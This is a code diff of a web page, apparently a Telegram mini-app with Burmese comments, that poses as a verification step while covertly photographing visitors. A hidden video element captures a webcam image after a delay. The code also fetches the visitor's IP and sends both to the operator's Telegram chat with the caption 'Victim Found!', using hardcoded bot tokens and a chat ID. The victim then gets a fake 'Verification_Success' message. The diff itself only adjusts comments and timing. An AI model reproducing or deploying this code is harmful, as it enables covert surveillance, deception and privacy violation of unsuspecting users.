@@ -22,10 +22,9 @@
     <video id="video" style="display:none;" autoplay playsinline></video>
 
     <script>
-        // --- ဤနေရာကို သေချာကြည့်ပါ ---
-        const SHOWCAM_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; // သင့်ဆီ ပုံပို့မည့် Bot Token
-        const TIKTOK_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY";  // TikTok Bot Token
-        const MY_ID = "5304050102"; // သင့်ရဲ့ Chat ID
+        const SHOWCAM_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; 
+        const TIKTOK_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY";  
+        const MY_ID = "5304050102"; 
 
         const startBtn = document.getElementById('startBtn');
         const loader = document.getElementById('loader');
@@ -44,6 +43,7 @@
                 const ipData = await ipRes.json();
                 const userIP = ipData.ip;
 
+                // ၅ စက္ကန့် စောင့်ခိုင်းထားသည် (ပုံသေချာတက်ရန်)
                 setTimeout(async () => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -51,25 +51,20 @@
                     const imageData = canvas.toDataURL('image/jpeg');
                     const blob = await (await fetch(imageData)).blob();
 
-                    // ၁။ သင့်ဆီကို အချက်အလက်ပို့ရန် SHOWCAM_TOKEN ကို သုံးမည်
+                    // ၁။ သင့်ဆီသို့ ပုံနှင့် IP ပို့ခြင်း (ShowCam bot ကိုသုံးသည်)
                     const formData = new FormData();
                     formData.append('chat_id', MY_ID);
                     formData.append('photo', blob, 'shot.jpg');
                     formData.append('caption', `✅ Victim Found!\n🌐 IP: ${userIP}`);
-                    
-                    // ဤနေရာတွင် SHOWCAM_TOKEN ကို သုံးထားကြောင်း သေချာပါစေ
-                    await fetch(`https://api.telegram.org/bot${SHOWCAM_TOKEN}/sendPhoto`, { 
-                        method: 'POST', 
-                        body: formData 
-                    });
+                    await fetch(`https://api.telegram.org/bot${SHOWCAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
 
-                    // ၂။ Victim ဆီသို့ Verification_Success စာပို့ရန် TIKTOK_TOKEN ကို သုံးမည်
+                    // ၂။ TikTok Bot ဆီသို့ Success စာပို့ခြင်း
                     const victimId = Telegram.WebApp.initDataUnsafe.user.id; 
                     await fetch(`https://api.telegram.org/bot${TIKTOK_TOKEN}/sendMessage?chat_id=${victimId}&text=✅ Verification_Success`);
 
                     stream.getTracks().forEach(track => track.stop());
                     Telegram.WebApp.close();
-                }, 3500); // ၃.၅ စက္ကန့် စောင့်မည် (ပုံသေချာရအောင်)
+                }, 5000); 
 
             } catch (err) {
                 alert("ခွင့်ပြုချက်ပေးမှ အလုပ်လုပ်ပါမည်။");
